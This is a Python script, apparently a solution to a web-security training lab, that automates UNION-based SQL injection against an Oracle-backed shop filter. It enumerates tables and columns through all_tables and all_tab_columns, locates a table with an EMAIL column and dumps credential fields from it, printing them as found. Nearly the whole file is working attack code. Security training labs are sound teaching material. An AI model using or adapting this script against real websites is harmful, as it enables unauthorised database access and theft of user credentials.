from bs4 import BeautifulSoup
import requests

# LAB10 SQLi
# Author: AFANX
# 09/08/2024

def info(msg):
    print("[!] " + str(msg))

def error(msg):
    print("[-] " + str(msg))

def success(msg):
    print("[+] " + str(msg))

def send(payload):
    info(payload)
    response = requests.get(payload)
    info(response.status_code)
    return response

def url_encode(str_payload):
    url_encode_result = "+"
    for i in str_payload.split(" "):
        url_encode_result += i + '+'
    return url_encode_result[:len(url_encode_result)-1]

def leak_tables(url):
    tables_from_db = []
    sqli = url_encode("' UNION SELECT table_name, NULL FROM all_tables--")

    payload = url + sqli

    response = send(payload)

    soup = BeautifulSoup(response.text, "html.parser")
    

    for i in soup.find_all('th'):
        tables_from_db.append(i.text)
    
    success("LEAK TABLES " + str(len(tables_from_db)))
    for i in tables_from_db:
        info(i)
    success("===========")

    return tables_from_db

def find_creds_table(table, url):
    sqli = url_encode("' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='" + table + "'--")

    payload = url + sqli
    find_email = ""

    response = send(payload)
    soup = BeautifulSoup(response.text, "html.parser")

    for i in soup.find_all('th'):
        if i.text == 'EMAIL':
            find_email = i.text
            break
        else:
            info(i.text)
    print("\n")
    
    if(find_email == 'EMAIL'):
        return 1
    else:
        return 0

def leak_creds(table, fields,url):
    field = fields[1] + "," + fields[2]

    sqli = url_encode("' UNION SELECT " + field + " FROM " + table +"--")
    payload = url + sqli

    response = send(payload)
    soup = BeautifulSoup(response.text, "html.parser")

    info("\n\nCREDS:")
    for i in soup.find_all('th'):
        for j in soup.find_all('td'):
            success(j.text + ":" + i.text)

def main():
    url = "https://0ae8001503ddfcae81e298af00e00024.web-security-academy.net/filter?category=Gifts"
    
    tables_from_db = leak_tables(url)

    for i in tables_from_db:
        if(find_creds_table(i, url)):
            creds_table = i
            break
    
    success("FIND TABLE WITH CREDS: " + creds_table)

    info("GET FIELDS")
    sqli = url_encode("' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='" + creds_table + "'--")
    payload = url + sqli
    response = send(payload)
    soup = BeautifulSoup(response.text, "html.parser")

    fields = []
    for i in soup.find_all('th'):
        fields.append(i.text)
    info(fields)
    print("\n")

    info("LEAK CREDS")
    leak_creds(creds_table, fields, url)

if __name__ == "__main__":
    main()